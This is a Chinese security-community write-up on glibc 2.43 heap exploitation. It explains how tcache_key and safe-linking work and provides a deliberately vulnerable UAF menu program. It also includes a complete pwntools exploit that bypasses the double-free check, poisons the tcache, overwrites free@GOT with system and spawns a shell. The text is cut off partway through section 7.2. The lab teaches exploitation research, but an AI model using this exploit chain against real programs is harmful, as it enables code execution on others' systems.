---
title: 【先知】glibc 2.43 堆利用实战：tcache_key + safe-linking 双重防线下的 UAF 到 Getshell
source: https://xz.aliyun.com/news/92890
source_host: xz.aliyun.com
clip_date: 2026-09-29T16:31:37+08:00
trace_id: 39a71baf-6c7a-4410-a6be-e622a641606a
content_hash: cace172428159205d7f68918692159e9fff6f2fc63e44adbacb1eb309f3bce78
status: synced
tags:
  - 先知
  - Linux安全
  - 漏洞分析
series: null
feed_source: 先知安全技术社区
ai_summary: glibc 2.43 的 tcache_key 与 safe-linking 都能被 UAF 绕过，最终以 tcache poisoning 覆写 `free@GOT=system` 完成 Getshell。
ai_summary_style: key-points
images_status:
  total: 14
  succeeded: 14
  failed_urls: []
notion_page_id: 3ea75244-d011-8185-a2ee-f00001b92e02
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> glibc 2.43 的 tcache_key 与 safe-linking 都能被 UAF 绕过，最终以 tcache poisoning 覆写 `free@GOT=system` 完成 Getshell。
> 
> - **懒初始化变化：** 2.43 的 `tcache_perthread_struct` 改为首次 `free` 才从堆分配，首个 malloc 返回 `heap_base+0x10`，堆布局更可预测。
> - **绕过 tcache_key：** 唯一 double-free 检测点是 free 快速路径的 key 比对；UAF 保留 fd 编码、只清 `+8` 处 key 即可让检测失明，形成 `A→B→A` dup 链。
> - **safe-linking 双向性：** 链尾 `fd = chunk_user>>12` 本身是 heap 泄露原语；伪造 next 须写入 `(A_user>>12)^target`，且目标必须 16 字节对齐（malloc 仅校验对齐）。
> - **主链步骤：** unsorted bin 泄露 libc（`main_arena+0x108`，偏移 `0x1e7ac8`）→ 清 key → tcache poisoning → 写 `free@GOT` → `free("/bin/sh")`。
> - **无 hook 时代取舍：** `__free_hook` 只剩僵尸符号，2.42+ 的 `__exit_funcs` 受 PTR_MANGLE（XOR guard + ROL17，密钥在 TCB+0x30）保护，Partial RELRO 的 GOT 覆写仍最稳定。

> 随机 `tcache_key` 拦截 double-free，safe-linking 隐藏链表指针，malloc/free hook 被连根移除。

* * *

## 1\. 背景：glibc 堆安全机制演进时间线

|     |     |     |
| --- | --- | --- |  
| 版本  | 防护机制 | 影响  |
| 2.26 | 引入 tcache（per-thread cache） | 小 chunk 释放后进入线程本地缓存，利用面急剧扩大 |
| 2.32 | 引入 safe-linking | tcache 与 fastbin 中的 fd 指针做 XOR 编码，防任意地址分配 |
| 2.34 | 移除 malloc/free/realloc hook、memalign hook | 传统 `__free_hook → system` 打法失效 |
| 2.34 | 移除 `_dl_open_hook` ，加固 `_rtld_global` | 动态链接器全局对象利用受限 |
| 2.36 | `__nptl_initial_error_t` 等加固 | —   |
| 2.37 | tcache 计数与指针强校验 | 部分 tcache 结构伪造受限 |
| 2.42 | 引入随机 `tcache_key` 检测 double-free | 经典的 `double-free → tcache dup` 链路需要先绕过 key 检测 |
| 2.42 | exit funcs 指针 PTR_MANGLE 加密 | 覆写 `__exit_funcs` / `_rtld_global` 中函数指针不再直接生效 |
| 2.43 | tcache struct 懒初始化、TCACHE_MAX_BINS 扩展 | heap 布局变化、利用细节变化 |

* * *

## 2\. 实验环境

```plain
cat /etc/os-release | head -2
ldd --version | head -1
uname -r
gcc --version | head -1
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/836d21b8cf443537.png)

libc 路径： `/lib/x86_64-linux-gnu/libc.so.6`

* * *

## 3\. 漏洞模型：一个典型的 UAF 菜单程序

为聚焦堆利用本身，我们构造一个极简但真实的漏洞模型：一个基于菜单交互的内存管理服务，其 `delete` 释放 chunk 后 **未将指针置空**， `edit` 对已释放 chunk 仍可任意写入， `show` 可读取任意长度数据。这正是 UAF（Use-After-Free）类漏洞的典型形态，常见于各类内存管理服务、浏览器渲染进程、游戏客户端插件系统等真实攻击面。

**vuln.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    void *ptr;
    size_t size;
} chunk_t;

chunk_t chunks[16];

void add_chunk(int idx, size_t size) {
    if (idx < 0 || idx >= 16 || chunks[idx].ptr) {
        puts("invalid or already allocated");
        return;
    }
    chunks[idx].ptr = malloc(size);
    chunks[idx].size = size;
    printf("[+] allocated chunk %d size 0x%zx\n", idx, size);
    printf("data> ");
    read(0, chunks[idx].ptr, size);
}

void delete_chunk(int idx) {
    if (idx < 0 || idx >= 16 || !chunks[idx].ptr) {
        puts("invalid");
        return;
    }
    free(chunks[idx].ptr);      // UAF: 释放后未置 NULL
    printf("[+] freed chunk %d\n", idx);
}

void edit_chunk(int idx) {
    if (idx < 0 || idx >= 16 || !chunks[idx].ptr) {
        puts("invalid");
        return;
    }
    printf("data> ");
    read(0, chunks[idx].ptr, 0x1000);   // 无边界检查，可覆写已释放 chunk 元数据
}

void show_chunk(int idx) {
    if (idx < 0 || idx >= 16 || !chunks[idx].ptr) {
        puts("invalid");
        return;
    }
    write(1, chunks[idx].ptr, chunks[idx].size);
    write(1, "\n", 1);
}

int main() {
    setbuf(stdout, NULL);
    char choice[8];
    while (1) {
        printf("\nmenu> 1.add 2.delete 3.edit 4.show 5.exit\n> ");
        read(0, choice, 8);
        switch (choice[0]) {
            case '1': {
                int idx; size_t size;
                printf("idx> "); scanf("%d", &idx);
                printf("size> "); scanf("%zu", &size);
                getchar();
                add_chunk(idx, size);
                break;
            }
            case '2': {
                int idx;
                printf("idx> "); scanf("%d", &idx);
                getchar();
                delete_chunk(idx);
                break;
            }
            case '3': {
                int idx;
                printf("idx> "); scanf("%d", &idx);
                getchar();
                edit_chunk(idx);
                break;
            }
            case '4': {
                int idx;
                printf("idx> "); scanf("%d", &idx);
                getchar();
                show_chunk(idx);
                break;
            }
            case '5':
                return 0;
        }
    }
}
```

编译参数： `gcc -o vuln vuln.c -g -O0` （默认开启 PIE、Partial RELRO、NX；无 canary）。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e098307a994a6a13.png)

* * *

## 4\. glibc 2.43 的 tcache 机制变化

### 4.1 tcache 懒初始化与 \__tcache_dummy

在旧版本（2.26 ~ 2.41）中， `tcache_perthread_struct` 是进程第一次分配内存时从 heap 中切出的，位于堆段开头：

```plain
旧布局: [tcache_perthread_struct][chunk1][chunk2]...
```

在 glibc 2.43 中，发现该结构改为 **懒初始化**：

**glibc malloc/tcache.c（2.43）**

```c
static __thread tcache_perthread_struct *tcache = &__tcache_dummy;
```

进程启动后 `tcache` 指针指向 libc BSS 段的静态占位 `__tcache_dummy` ， **malloc 不会触发 tcache 初始化**；直到第一次 `free` 时 `tcache_init()` 才从 heap 中分配真正的 per-thread 结构。

#### gdb 断点对比：

**observe.c 片段**

```c
char *a = malloc(0x18);
char *b = malloc(0x18);
printf("a=%p b=%p\n", a, b);          // 断点 A
free(a);
printf("[after free(a)] ...\n");      // 断点 B
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2712231a32dee6c0.png)

关键点：

```plain
# 断点 A（malloc 之后，尚未 free）：
(gdb) p/x tcache
$1 = 0x7ffff7f51ba0 <__tcache_dummy>        # 仍指向 libc BSS 静态占位！
(gdb) p/x a
$2 = 0x555555559010                          # heap 段 + 0x10

# 断点 B（free(a) 之后）：
(gdb) p/x tcache
$3 = 0x555555559460                          # 第一次 free 时才在 heap 分配
```

**第一个 malloc 得到的用户指针就是** `heap_base + 0x10` ，heap 段开头不再被 tcache 结构占用。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2712231a32dee6c0.png)

`__tcache_dummy` 的地址 `0x7ffff7f51ba0` 相对 libc 基址偏移为 `0x1a5ba0` ，位于 libc 的 BSS/TLS 静态区域。

> 对利用者的意义：堆布局更可预测（首个 chunk 偏移固定为 0x10），且 tcache 结构不再总是占据 heap 开头，但这并不意味着 tcache 结构无法被利用——它只是从"堆首占位"变成了"free 时才出现"。

### 4.2 tcache 关键路径源码逐行走读

以下行号均以 Kali 2026.1 自带 glibc 2.43 源码（ `glibc-2.43/malloc/malloc.c` ）为准，实测核对于源码包与 gdb 断点。先看两个核心数据结构（2879-2896 行）：

```c
typedef struct tcache_entry
{
  struct tcache_entry *next;     /* 单向链表 next（safe-linking 编码存储） */
  uintptr_t key;                 /* double-free 检测 key：进程级随机数      */
} tcache_entry;

typedef struct tcache_perthread_struct
{
  uint16_t num_slots[TCACHE_MAX_BINS];    /* 每个 bin 的空闲槽计数（初始 16） */
  tcache_entry *entries[TCACHE_MAX_BINS]; /* 每个 bin 的链表头指针            */
} tcache_perthread_struct;
```

`next` 与 `key` 相邻存放，对应 chunk 用户数据偏移 `+0` / `+8` ——这正是 4.1 观察到的布局。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c197512a451c5420.png)

#### 4.2.1 tcache_put_n：入链（free 的 tcache 快速路径）

`free()` 在 `__libc_free` 中先走快速路径（3344-3364 行）：

```c
#if USE_TCACHE
  if (__glibc_likely (size < mp_.tcache_max_bytes))           // 3344
    {
      tcache_entry *e = (tcache_entry *) chunk2mem (p);
      if (__glibc_unlikely (e->key == tcache_key))            // 3348  ← double-free 检测入口
        return tcache_double_free_verify (e);
      size_t tc_idx = csize2tidx (size);
      if (__glibc_likely (tc_idx < TCACHE_SMALL_BINS))
        {
          if (__glibc_likely (tcache->num_slots[tc_idx] != 0)) // 3354
            return tcache_put (p, tc_idx);
        }
      ...
```

逐行解读：

|     |     |     |
| --- | --- | --- |  
| 行号  | 代码  | 含义  |
| 3344 | `size < mp_.tcache_max_bytes` | 仅 chunk size `< 0x411` （即 ≤ 0x410，对应 malloc 请求 ≤ 0x400）走 tcache；更大的进 unsorted / large bin |
| 3348 | `e->key == tcache_key` | **唯一** 的 tcache double-free 检测点：key 匹配即触发全链扫描 |
| 3354 | `num_slots[tc_idx] != 0` | 计数耗尽（默认 16）后不再入链，转入常规 free |
| 3357 | `tcache_put(p, tc_idx)` | 真正入链 |

`tcache_put_n` 本体（2996-3017 行）：

```c
static __always_inline void
tcache_put_n (mchunkptr chunk, size_t tc_idx, tcache_entry **ep, bool mangled)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  e->key = tcache_key;                          // ① 写 key（进程随机数）
  if (!mangled)
    {
      e->next = PROTECT_PTR (&e->next, *ep);    // ② 编码旧链表头
      *ep = e;                                  // ③ 头插法
    }
  ...
  --(tcache->num_slots[tc_idx]);                // ④ 计数 -1
}
```

与利用直接相关的三个事实：

1.  `e->key = tcache_key` **写在用户数据区** `+8` **处**。 `free` 之后 chunk 内容对攻击者依然可写（UAF），这是"清 key 绕过"的前提；
2.  `PROTECT_PTR (&e->next, *ep)` ：头插时新链头的 `next` 存的是"旧链表头的编码值"，编码密钥为 `&e->next >> 12` ；
3.  计数从 16 递减到 0 后，该 bin 不再收 chunk。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a67d1357e248939b.png)

#### 4.2.2 tcache_get_n：出链（malloc 的 tcache 快速路径）

`malloc()` 在 `__libc_malloc` 的 tcache 段（3283-3297 行）：

```c
  if (nb < mp_.tcache_max_bytes)
    {
      size_t tc_idx = csize2tidx (nb);
      if (__glibc_likely (tc_idx < TCACHE_SMALL_BINS))
        {
          if (tcache->entries[tc_idx] != NULL)     // 链表非空即取
            return tag_new_usable (tcache_get (tc_idx));
        }
```

`tcache_get_n` 本体（3019-3042 行）：

```c
static __always_inline void *
tcache_get_n (size_t tc_idx, tcache_entry **ep, bool mangled)
{
  tcache_entry *e;
  ...
  e = *ep;                                        // ① 直接取链表头
  if (__glibc_unlikely (misaligned_mem (e)))      // ② 唯一校验：16 字节对齐
    malloc_printerr ("malloc(): unaligned tcache chunk detected");
  *ep = REVEAL_PTR (e->next);                     // ③ 解码 next 成为新链头
  ++(tcache->num_slots[tc_idx]);                  // ④ 计数 +1
  e->key = 0;                                     // ⑤ 清 key！
  return (void *) e;
}
```

**注意** `misaligned_mem` **只检查对齐** （ `(uintptr_t)m & 0xf` ，malloc.c 1247 行），不检查 chunk 是否真实、size 是否合法。这是 tcache poisoning 能成立的根本原因：只要把伪造地址按编码公式放进链表头，下一次 `malloc` 就原样返回该地址；唯一约束是目标 16 字节对齐（6.2 用 `free_got & ~0xf` 满足）。

另一个容易被忽略的点： `e->key = 0` 发生在 **get 时**。也就是说——正常从 tcache 取出的 chunk，其 `+8` 处的 key 已被清零，不会误触发 double-free 检测；而 **仍在链上的 freed chunk，key 保持 tcache_key 不变**。这条语义直接决定了 6.1 的绕过手法。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/03f2655ab29a5a4c.png)

#### 4.2.3 double-free 检测：tcache_double_free_verify

当 3348 行命中（ `e->key == tcache_key` ）时进入 `tcache_double_free_verify` （3140-3165 行）：

```c
static __attribute__ ((noinline)) void
tcache_double_free_verify (tcache_entry *e)
{
  for (size_t tc_idx = 0; tc_idx < TCACHE_MAX_BINS; ++tc_idx)
    {
      size_t cnt = 0;
      for (tmp = tcache->entries[tc_idx]; tmp; tmp = REVEAL_PTR (tmp->next), ++cnt)
        {
          if (cnt >= mp_.tcache_count)
            malloc_printerr ("free(): too many chunks detected in tcache");
          if (__glibc_unlikely (misaligned_mem (tmp)))
            malloc_printerr ("free(): unaligned chunk detected in tcache 2");
          if (tmp == e)                            // 物理地址比对
            malloc_printerr ("free(): double free detected in tcache 2");
        }
    }
  e->key = 0;                                      // 未命中：清 key 后重试
  __libc_free (e);
}
```

这个函数做了三件事：

1.  **遍历全部 76 个 bin 的每条链**，逐个 REVEAL_PTR 解码后与待释放 chunk **物理地址** 比对；
2.  途中顺带检查链长（ `cnt >= tcache_count` → "too many chunks"）与对齐（→ "unaligned"）；
3.  全链未命中时，认为"可能属于其他线程或 key 巧合"， **自动清 key 并再次 free**——不会误杀。

对攻击者：只要保证第二次 free 时 `e->key != tcache_key` ，就根本不会进入这个函数；而一旦进入，链上存在同一物理地址必然被抓。所以 **绕过只能在入链前完成**：UAF 把 key 清零。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4a9250b735f0c35d.png)

#### 4.2.4 懒初始化与计数管理的完整闭环

把 4.1 与上述路径串起来：

```plain
首次 malloc        → tcache 指向 __tcache_dummy（BSS），不初始化
首次 free(a)       → 3344 通过 → 3348 通过 → 3354 发现 num_slots==0
                     → tcache_free_init() → tcache_init() 从 heap 分配
                       tcache_perthread_struct
                     → num_slots[0..75] = 16，随后正常入链
```

`tcache_init` （3206-3231 行）把每个 bin 的 `num_slots` 初始化为 `mp_.tcache_count` ，该默认值来自 `TCACHE_FILL_COUNT = 16` （malloc.c 317 / 1832 行）。 **每 bin 上限 16，不是旧版的 7**——2.37 起由 7 提升到 16，2.43 延续。

> 小结（对利用者）：整条 tcache 路径上，真正会拦住攻击者的检查只有两个——3348 行的 key 匹配、3030 行的 16 字节对齐。前者用 UAF 清 key 绕过，后者用 `& ~0xf` 对齐满足。其余全是"信任"。

### 4.3 tcache_key 随机化与 double-free 检测

glibc 2.42 引入的 `tcache_key` 是本次利用需要绕过的第一道防线。

**glibc malloc/tcache.c（2.42+）**

```c
static __thread uintptr_t tcache_key;

static void
tcache_key_initialize (void)
{
  tcache_key = (uintptr_t) &tcache_key;   // 早期实现
#ifdef __i386__
  ...
#else
  tcache_key ^= __getrandom ();           // 2.42 起引入真正的随机熵
#endif
}
```

每个线程拥有独立的随机 `tcache_key` 。在 `tcache_put` 时，除了写入经过 safe-linking 编码的 `fd` ，还会在 chunk 用户数据偏移 `+8` 处写入 `tcache_key` ：

```c
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  ...
  e->key = tcache_key;                    // 写入随机 key
  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  ...
}
```

`tcache_get_n` 取出 chunk 时 **不检查** key—— `malloc()` 路径本身没有 double-free 检测，它只在对齐校验后把 `e->key` 清零（见 4.2.2 的 ⑤，malloc.c 3042 行），从而避免该 chunk 下次 `free` 时误触发 3348 行的检测。这也正是"取出即清 key"语义的由来。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8e04b03c2fc92a9b.png)

-   `key` 是 **进程级随机数** （此处为 `0xd6d50ee86e2a383c` ），同一线程所有 chunk 共用；
-   链尾 chunk（ `a` ）的 `fd(enc) = 0x55956f1b8` ，即 `a_user >> 12` ——这是 safe-linking 编码后"指向 NULL"的表现；
-   链中 chunk（ `b` ）的 `fd(enc) = 0x5590364d71a8` ，为 `PROTECT_PTR(&b->next, a)` 的编码结果。

直接 double-free 会被检测并 abort：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/99f2401214567d5b.png)

> 退出码 `134 = 128 + 6` ：shell 约定被信号杀死的进程退出状态为 `128 + 信号编号` ， `6` 即 SIGABRT（zsh 提示 `IOT instruction` ）。glibc 检测到 double-free 后经 `malloc_printerr` 路径调用 `abort()` 终止进程，因此 `echo $?` 是区分"glibc 主动 abort"（134）与其他崩溃（如 SIGSEGV = 139）的最快判据，也证明 3348 行的检测真实生效。

**绕过思路**： `tcache_get` 在 **取出** chunk 时会清掉 `e->key` 。因此只要在第二次 `free` 之前，通过 UAF 把目标 chunk 的 `key` 字段清零（或改写为任意非 `tcache_key` 的值），即可让检测失明，完成 double-free → tcache dup。

### 4.4 safe-linking 指针编码

glibc 2.32 引入的 safe-linking 对 tcache/fastbin 链表指针做编码：

```c
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&(ptr), ptr)
```

对利用者的意义：

1.  **堆泄露原语**：释放单个 chunk 到空 tcache bin，通过 UAF 读其 `fd` ，得到 `chunk_user >> 12` 。由于用户指针低 12 位在本文环境固定为 `0x010` （见 4.1），堆基址即可恢复；
2.  **任意地址分配**：伪造 tcache 链时，写入的 next 必须是 `PROTECT_PTR(&e->next, target) = (e_user >> 12) ^ target` ，且 `target` 必须 **16 字节对齐** （ `tcache_get_n` 会做 `misaligned_mem` 检查）。

### 4.5 TCACHE_MAX_BINS 扩展

2.42/2.43 中 `TCACHE_MAX_BINS` 从经典的 64 扩展为 76（ `64 + 12` ，为 smallbin 上限 0x3f0 以上的 12 个 bin 腾出缓存空间）：

```c
/* We want 64 entries, but the bottom 12 bits of any pointer
   are always zero, so we can use those bits to store the counts... */
#define TCACHE_MAX_BINS 76
```

注意：虽然 tcache 结构仍为 `num_slots[TCACHE_MAX_BINS] (uint16_t) + entries[TCACHE_MAX_BINS] (指针)` （2.43 中该字段名为 `num_slots` ，语义即空闲计数，见 4.2），但其懒初始化特性（4.1）使其不再默认占用 heap 开头。

* * *

## 5\. 信息泄露原语

利用链的第一步是恢复 ASLR 后的关键基址：heap 基址与 libc 基址。

### 5.1 heap 基址泄露（tcache 链尾编码）

操作序列：

```plain
add(0, 0x18, "A")    # A
add(1, 0x18, "B")    # B
add(2, 0x500, "C")   # C：大 chunk，用于 unsorted 泄露
add(3, 0x18, "D")    # D：隔离 chunk，防止 C 与 top chunk 合并

delete(0)            # A -> tcache[0]（唯一元素，链尾）
show(0)              # UAF 读 A 的 fd 字段
```

A 的 `fd` 此时为 `PROTECT_PTR(&A->next, NULL) = A_user >> 12` ：

```plain
fd_leak = 0x5556a83770   # = A_user >> 12
heap_base = fd_leak << 12 = 0x5556a8377000
A_user = heap_base + 0x10 = 0x5556a8377010
```

### 5.2 libc 基址泄露（unsorted bin）

`delete(2)` 释放 0x500 的 C 后，C 进入 unsorted bin，其 `fd` / `bk` 指向 `main_arena` 内的 unsorted 链表头（ `main_arena + 0x108` ）。通过 UAF `show(2)` 读出：

```plain
unsorted_fd = 0x7f8ef2453ac8
libc_base = unsorted_fd - 0x1e7ac8 = 0x7f8ef226c000
```

其中 `0x1e7ac8` 是 glibc 2.43-4 中 `main_arena` 到 unsorted 链表头的偏移（ `main_arena = libc_base + 0x1e7ac0` ，unsorted 头 = `main_arena + 0x108` ），

gdb 调试：

```plain
(gdb) p main_arena
$1 = 0x7ffff7f93ac0          # libc_base + 0x1e7ac0
# unsorted head = main_arena + 0x108 = libc_base + 0x1e7ac8
```

关键符号偏移（libc 2.43-4，供后续使用）：

|     |     |
| --- | --- | 
| 符号  | 偏移  |
| `system` | 0x543f0 |
| `environ` | 0x1eede8 |
| `_IO_2_1_stdout_` | 0x1e8580 |
| `__libc_start_main` | 0x2a050 |
| `main_arena` | 0x1e7ac0 |
| `__exit_funcs` | 0x1e8fa0 |

* * *

## 6\. 完整利用链

### 6.1 绕过 double-free 检测（tcache_key）

目标：让同一个 chunk（A）两次进入 tcache，形成 `A → B → A` 的 dup 链。

```plain
delete(0)                         # tcache: A
delete(1)                         # tcache: B -> A

# A 现在位于链尾（freed 状态），chunks[0] 仍指向 A（UAF）
# 保留 A.fd（链完整性），仅将 A.key 清零：
edit(0, p64(A_user >> 12) + p64(0))

delete(0)                         # A 再次 free：key=0 != tcache_key，检测失明
                                  # tcache: A -> B -> A   (double-free 成功!)
```

注意： `edit` 覆写 A 前 16 字节时， **必须保留前 8 字节的 fd 编码值** （否则破坏链表完整性），只清 `+8` 处的 `key` 。

### 6.2 tcache poisoning（safe-linking 编码）

连续两次 `add` 消费 dup 链，使链头重新落在 A（freed 状态、仍可通过 UAF 写）：

```plain
add(4, 0x18)    # 取 A（链头），tcache: B -> A
add(5, 0x18)    # 取 B，tcache: A
                # 现在 tcache[0] 链头 = A（仍在链上，chunks[4] 也指向 A）
```

伪造 A 的 next，使其指向攻击目标（16 字节对齐）：

```plain
target = free_got & ~0xf
enc_fd = (A_user >> 12) ^ target      # PROTECT_PTR(&A->next, target)
edit(4, p64(enc_fd))
```

再次消费：

```plain
add(6, 0x18)    # 取 A -> 链头 = target
add(7, 0x18, payload)   # 取 target！后续 read 直接向 target 写入 payload
```

一次任意地址写完成。

### 6.3 任意写 free@GOT = system → Getshell

vuln 是 Partial RELRO，GOT 可写。将 `free@GOT` 覆写为 `system` ，再让程序 `free` 一块内容为 `/bin/sh` 的 chunk，即可完成 `free("/bin/sh") → system("/bin/sh")` ：

```plain
free_got = vuln_base + e.got['free']     # e.got 在 e.address 设置后为绝对地址
off = free_got & 0xf                     # GOT 项在 0x10 对齐页内的偏移
payload = b'A' * off + p64(system_addr)  # 将 system 写到 free@GOT 位置
payload = payload.ljust(0x18, b'B')
add(7, 0x18, payload)                    # 分配 target，顺带写入

add(8, 0x38, b'/bin/sh\x00' + b'C'*0x30)  # 用不同 size，避免与 tcache[0] 链冲突
delete(8)                                # free("/bin/sh") -> system("/bin/sh")
```

注意两点：

-   `target` 必须 16 字节对齐，GOT 项不保证对齐，故写 `free_got & ~0xf` ，用 `off` 修正偏移；
-   触发用的 chunk 使用与 dup 链不同的 size（0x38），从空的 tcache bin 走 top 分配，避免撞上已污染的 tcache\[0\] 链。

### 6.4 exploit 完整代码

**exploit_full.py**

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

BIN  = '/home/nl/heap-lab/vuln'
LIBC = '/lib/x86_64-linux-gnu/libc.so.6'

def add(p, idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx> ', str(idx).encode())
    p.sendlineafter(b'size> ', str(size).encode())
    p.sendafter(b'data> ', data)

def delete(p, idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx> ', str(idx).encode())

def edit(p, idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx> ', str(idx).encode())
    p.sendafter(b'data> ', data)

def show(p, idx, n):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx> ', str(idx).encode())
    d = p.recvn(n)
    p.recvn(1)          # 消费 '\n'
    return d

p = process(BIN)
e = ELF(BIN)
libc = ELF(LIBC)

# PIE base（本地 pwntools 解析；远程场景见第 7 节讨论）
e.address = p.libs()[BIN]

add(p, 0, 0x18, b'A'*0x18)       # A
add(p, 1, 0x18, b'B'*0x18)       # B
add(p, 2, 0x500, b'C'*0x100)     # C -> unsorted
add(p, 3, 0x18, b'D'*0x18)       # D 隔离

# ---- libc 泄露 ----
delete(p, 2)
unsorted_fd = u64(show(p, 2, 0x500)[:8])
libc.address = unsorted_fd - 0x1e7ac8
log.info(f'libc_base = {hex(libc.address)}')

# ---- heap 泄露 ----
delete(p, 0)
fd_leak = u64(show(p, 0, 0x18)[:8])
heap_base = fd_leak << 12
A_user = heap_base + 0x10
log.info(f'heap_base = {hex(heap_base)}  A_user={hex(A_user)}')

# ---- tcache dup（清 key 绕过）----
delete(p, 1)
edit(p, 0, p64(A_user >> 12) + p64(0))   # 保留 fd，清零 key
delete(p, 0)                             # tcache: A -> B -> A

# ---- tcache poisoning ----
add(p, 4, 0x18, b'P'*0x18)
add(p, 5, 0x18, b'Q'*0x18)

free_got = e.got['free']
target   = free_got & ~0xf
off      = free_got & 0xf
system_addr = libc.symbols['system']

edit(p, 4, p64((A_user >> 12) ^ target))   # A.fd = PROTECT_PTR(A, target)
add(p, 6, 0x18, b'R'*0x18)

payload = (b'A' * off + p64(system_addr)).ljust(0x18, b'B')
add(p, 7, 0x18, payload)                   # 任意写 free@GOT = system

# ---- 触发 ----
add(p, 8, 0x38, b'/bin/sh\x00' + b'C'*0x30)
delete(p, 8)                               # free("/bin/sh") -> system("/bin/sh")

p.sendline(b'echo SHELL_OK; id')
print(p.recvuntil(b'SHELL_OK', timeout=3).decode(errors='replace'))
print('[+] GETSHELL SUCCESS')
p.interactive()
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c92e758408e0ccea.png)

### 6.5 利用链 × glibc

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/765dbdc30f995c32.png)

|     |     |     |     |
| --- | --- | --- | --- |   
| 步骤  | 攻击操作 | 触发的源码位置 | 为什么能过 |
| ① 准备 4 个 chunk | `add(0..3)` | `__libc_malloc` 3283-3297 | 前 3 个 0x18 请求走 tcache；0x500 的 C 超阈值走 top；D 用于隔离 |
| ② heap 泄露 | `delete(0)` + `show(0)` | `tcache_put_n` 3010 | 链尾 `fd = PROTECT_PTR(&A->next, NULL) = A_user>>12` ； `show` 是纯数据拷贝，无任何校验 |
| ③ libc 泄露 | `delete(2)` + `show(2)` | `_int_free` unsorted 路径 | 0x500 > 0x410 不进 tcache；单 chunk 时 `fd=bk=&main_arena+0x108` ， **不编码**，直接可读 |
| ④ 清 key | `edit(0, p64(fd)+p64(0))` | —（攻击者写入用户区） | `key` 位于用户区 `+8` ，free 后仍可写；只改 key 不动 fd，保持链完整 |
| ⑤ 二次 free 入链 | `delete(0)` | `__libc_free` 3348 | `e->key(0) != tcache_key` → **跳过** `tcache_double_free_verify` ；3354 计数非 0 → 直接 `tcache_put` 头插，形成 `A→B→A` dup 链 |
| ⑥ 消费 dup 链 | `add(4)` `add(5)` | `__libc_malloc` 3287 → `tcache_get_n` 3025 | 3030 行 `misaligned_mem` 只查 16 字节对齐，A/B 天然满足； `e->key=0` 顺带执行 |
| ⑦ 伪造 fd | `edit(4, p64((A>>12)^target))` | —（攻击者写入用户区） | 编码公式自逆： `REVEAL_PTR` 解码后恰好等于 `target` ；3025-3031 无"目标是否真实 chunk"检查 |
| ⑧ 任意分配 | `add(6)` `add(7)` | `tcache_get_n` 3030 | 第 7 次 malloc 返回 `target` （16 字节对齐的 GOT 页）；随后 `read` 直接写目标 |
| ⑨ 覆写 GOT | `payload` 写 system | `__libc_free` 3348 之后 | `free@GOT` 可写是 **Partial RELRO** 编译期决定；写的是 GOT 数据本身，glibc 不感知 |
| ⑩ getshell | `add(8, "/bin/sh")` + `delete(8)` | GOT 劫持后的间接调用 | `free("/bin/sh")` 实际执行 `system("/bin/sh")` ；第 8 个 chunk 用 0x38 从 top 分配，避开被污染的 tcache\[0\] |

-   **全程零 abort**：利用链没有任何一步触发 abort，因为唯一可能中断执行的两处检查——3348 行的 key 匹配、3030 行的对齐校验——分别被"清 key"与" `& ~0xf` 对齐"精确绕过；
-   **LIFO 消费顺序是 dup 链成立的前提**： `add(4)` 取走 A 后链头回到 B， `add(5)` 取走 B 后链头又回到 A，A 始终处于"已释放但在链上"的可写状态，⑦ 才有机会再次伪造 A.fd；
-   **触发 chunk 刻意避开污染链**：⑩ 选用 0x38 的 chunk 从 top 分配，是因为 tcache\[0\]（0x18 类）的链头已被伪造为 `target` ，若继续用 0x18 请求，malloc 会直接命中 `target` ，反而破坏刚写好的 GOT 布局。

* * *

## 7\. 无 hook 时代的 RCE 路径对比

glibc 2.34 移除 hooks 后， `__free_hook = system` 的经典打法彻底失效。我们在 2.43 上实测了另外两条常见路径的可行性，结论如下。

### 7.1 \__free_hook 的"僵尸化"

`readelf` 显示 `__free_hook` 符号仍然存在于 libc 动态符号表（WEAK OBJECT，偏移 `0x1ee188` ，版本 `GLIBC_2.2.5` ），但通过 `dlsym` 动态查找返回 NULL（`./hook_test` 退出码 1），gdb 确认运行时该符号不可达：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cbc5ba9fcd718a96.png)

> 2.34 起源码中的 hook 调用链已完全移除，符号仅作为 ABI 兼容的"僵尸"保留。 **写** `__free_hook` **不会影响** `free()` **行为**。

### 7.2 \__exit_funcs 的 PTR_MANGLE 保护（2.42+ 新发现）

另一个候选目标是 libc 的 atexit 链表 `__exit_funcs` （偏移 `0x1e8fa0` ）。覆写其 `fns[0].func.cxa.fn` 为 `system` ，让 `exit()` 触发 `system("/bin/sh")` ，是 2.34 后常见的"无 hook"打法之一。

